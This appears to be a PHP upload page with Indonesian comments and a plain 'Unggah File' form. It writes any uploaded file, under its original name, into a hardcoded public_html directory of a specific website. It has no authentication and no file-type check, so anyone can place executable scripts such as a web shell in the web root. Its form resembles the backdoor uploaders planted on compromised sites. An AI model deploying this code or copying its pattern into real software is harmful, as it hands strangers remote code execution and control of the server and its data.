

<?php
// Direktori tujuan
$targetDir = "/home/caqtqrsq/public_html/dosmart1.com/"; // Sesuaikan dengan direktori Anda

// Periksa apakah formulir sudah disubmit
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    if (isset($_FILES["file"]["tmp_name"]) && is_uploaded_file($_FILES["file"]["tmp_name"])) {
        // Nama file di direktori tujuan
        $targetFile = $targetDir . basename($_FILES["file"]["name"]);

        // Pastikan direktori tujuan ada
        if (!file_exists($targetDir)) {
            if (!mkdir($targetDir, 0755, true)) {
                die("Tidak dapat membuat direktori tujuan.");
            }
        }

        // Gunakan file_get_contents dan file_put_contents untuk memindahkan file
        $fileContent = file_get_contents($_FILES["file"]["tmp_name"]);
        if ($fileContent !== false && file_put_contents($targetFile, $fileContent)) {
            echo "File berhasil diunggah ke: " . htmlspecialchars($targetFile);
        } else {
            echo "Terjadi kesalahan saat mengunggah file.";
        }
    } else {
        echo "Tidak ada file yang dipilih atau file tidak valid.";
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Unggah File</title>
</head>
<body>
    <h1>Unggah File</h1>
    <form action="" method="post" enctype="multipart/form-data">
        <label for="file">Pilih file:</label>
        <input type="file" name="file" id="file" required>
        <button type="submit">Unggah</button>
    </form>
</body>
</html>
